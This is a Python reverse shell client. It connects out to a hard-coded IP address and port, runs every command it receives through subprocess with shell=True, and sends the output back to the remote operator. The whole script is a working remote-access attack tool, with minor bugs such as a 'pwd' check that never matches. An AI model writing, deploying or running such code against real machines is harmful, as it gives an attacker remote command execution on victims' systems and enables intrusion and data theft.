import socket
import subprocess
import sys
import os

from colorama import Style, Fore, Back

def Main():
    host = "192.168.100.224"
    port = 4723
    s  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((host,port))
    except ConnectionAbortedError:
        resp(1, "connection refused!")
        sys.exit()
    resp(0, "Shell connected with: {}:{}".format(host,port))
    while True:
        try:
            data = s.recv(4096).decode()
        except KeyboardInterrupt:
            resp(1, "Keyboard Interrupt!")
            sys.exit()
        if not data:
            break
        data = str(data)
        response = shell(data)
        try:
            s.send(response.encode())
        except ConnectionResetError:
            resp(1,"Connection Closed!. Try Again.")
            sys.exit()


def resp(toto, message):
    if toto == 1:
        print(f"{Fore.RESET} [{Fore.RED} ERROR {Fore.RESET}] Exiting the shell {message}")
    elif toto == 0:
        print("OK: {}".format(message))
def shell(command):
    command = command.rstrip()
    c_com = command[0:2]
    try:
        if c_com == 'cd':
            try:
                os.chdir(command[3:])
                run = "cd: directory changed: {}".format(command[3:])
            except FileNotFoundError:
                run = "cd: No such file or directory: ".format(command[3:])
        elif c_com == 'pwd':
            run = os.getcwd()
        else:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell = True, encoding = 'utf-8')
            if not output:
                run = "{}: command excuted!".format(c_com)
            else:
                run = output
    except subprocess.CalledProcessError:
        run = "{}: command not found!".format(command)
    return run
if __name__ == '__main__':
    if sys.platform == 'linux':
        Main()
    else:
        win = input("Supported plaform is out of range. Continue?[Y/n]")
        if win.lower() == "y":
            Main()
        else:
            sys.exit(0)